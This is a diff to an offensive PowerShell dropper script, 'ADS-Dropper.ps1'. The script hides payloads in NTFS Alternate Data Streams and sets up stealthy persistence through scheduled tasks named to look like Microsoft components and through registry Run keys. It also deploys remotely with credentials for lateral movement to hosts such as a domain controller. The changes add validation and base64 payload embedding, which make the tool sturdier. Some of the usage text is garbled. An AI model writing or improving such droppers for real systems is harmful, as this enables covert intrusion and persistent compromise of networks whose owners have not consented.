@@ -160,7 +160,7 @@ Full stealth (RECOMMENDED)
 Multiple persistence methods
 .\ADS-Dropper.ps1 -Payload `$payload -Persist @('task','reg')
 Lateral movement
-$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payload−Targets@(′dc01′)−Credential‘payload -Targets @('dc01') -Credential ` payload−Targets@(′dc01′)−Credential‘cred
+$cred = Get-Credential .\ADS-Dropper.ps1 -Payload payload−Targets@(′dc01′)−Credential‘payload -Targets @('dc01') -Credential ` payload−Targets@(′dc01′)−Credential
 PERSISTENCE METHODS:
 task Scheduled Task (admin required) └─ Triggers: Logon + periodic (every 5 min) └─ Path: \Microsoft\Windows\UX* or ...\UsbCeip
 reg Registry Run Key (user or admin) └─ HKCU/HKLM:...\CurrentVersion\Run └─ Fallback if not admin
@@ -201,8 +201,19 @@ Write-Host $helpText -ForegroundColor Cyan
     [PSCredential]$Credential
 )
 
+if ($Targets -notcontains 'localhost' -and -not $Credential) {
+    throw "Remote targets require -Credential parameter"
+}
+
+$validPersistMethods = @('task', 'reg', 'volroot')
+foreach ($method in $Persist) {
+    if ($method -notin $validPersistMethods) {
+        throw "Invalid persistence method: $method. Valid options: $($validPersistMethods -join ', ')"
+    }
+}
+
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ', ')| Persist: $($Persist -join ', ')" -ForegroundColor Cyan
+Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ', ') | Persist: $($Persist -join ', ')" -ForegroundColor Cyan
 
 function Get-RandomADSConfig {
     $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
@@ -252,8 +263,12 @@ function ConvertTo-PSPayload($PayloadObj) {
         if(-not (Test-Path $filePath)) {
             throw "Payload file not found: $filePath"
         }
-        
-        $content = Get-Content $filePath -Raw -Encoding UTF8
+
+        try {
+          $content = Get-Content $filePath -Raw -Encoding UTF8 -ErrorAction Stop
+        } catch {
+            throw "Failed to interpret file as UTF8 - '$filePath': $_"
+        }
         
         # Try to detect if it's Base64-encoded (Imix stagers are often double-encoded)
         try {
@@ -415,8 +430,10 @@ function Invoke-RemoteDeployment($Target, $PayloadObj, $PersistList, $RandomizeF
     ) -join "`n`n"
     
     # Escape single quotes in payload for safe embedding
-    $payloadEscaped = $PayloadObj -replace "'","''"
-    
+    $payloadBytes = [Text.Encoding]::UTF8.GetBytes($PayloadObj)
+    $payloadB64 = [Convert]::ToBase64String($payloadBytes)
+
+    $persistArray = $PersistList -join "','"
     $remoteBlock = [scriptblock]::Create(@"
 `$ErrorActionPreference = 'SilentlyContinue'
 
@@ -430,7 +447,7 @@ $allFunctions
 `$NoExec = `$$NoExecFlag
 
 # Convert payload
-`$rawPayload = ConvertTo-PSPayload '$payloadEscaped'
+`$rawPayload = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$payloadB64'))
 
 # Create ADS and loader
 `$cfg = Get-RandomADSConfig
@@ -438,9 +455,10 @@ $allFunctions
 `$loaderPath = New-Loader `$adsPath `$cfg
 
 # Set persistence
-foreach(`$pType in @('$($PersistList -join "','")')) { 
+foreach(`$pType in @('$persistArray')) { 
     New-PersistenceMechanism `$pType `$loaderPath `$cfg 
 }
+
 
 # Execute if requested
 if(-not `$NoExec) { 
